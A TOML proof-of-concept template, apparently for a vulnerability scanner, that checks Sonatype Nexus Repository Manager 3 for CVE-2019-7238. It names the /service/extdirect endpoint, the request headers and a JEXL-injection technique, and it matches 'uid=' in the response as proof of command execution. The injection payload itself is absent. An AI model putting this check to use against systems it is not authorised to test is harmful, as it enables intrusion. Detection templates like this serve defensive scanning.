[info]
author = "ave"
description = "检测 Sonatype Nexus Repository Manager 3 是否存在未授权远程代码执行漏洞。通过向 /service/extdirect 接口发送包含 JEXL 表达式注入的 POST 请求，验证目标是否存在访问控制缺陷，可导致任意命令执行。"
id = "POC-AVE-2019-1509"
name = "Sonatype Nexus Repository Manager 3 Remote Code Execution PoC"
severity = "critical"
tags = ["ave-2019-1509"]
vuln_id = [
    "CVE-2019-7238",
    "AVE-2019-1509",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/service/extdirect"
protocol = "http"

[poc.requests.body]
type = "json"

[poc.requests.headers]
Content-Type = "application/json"
X-Requested-With = "XMLHttpRequest"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
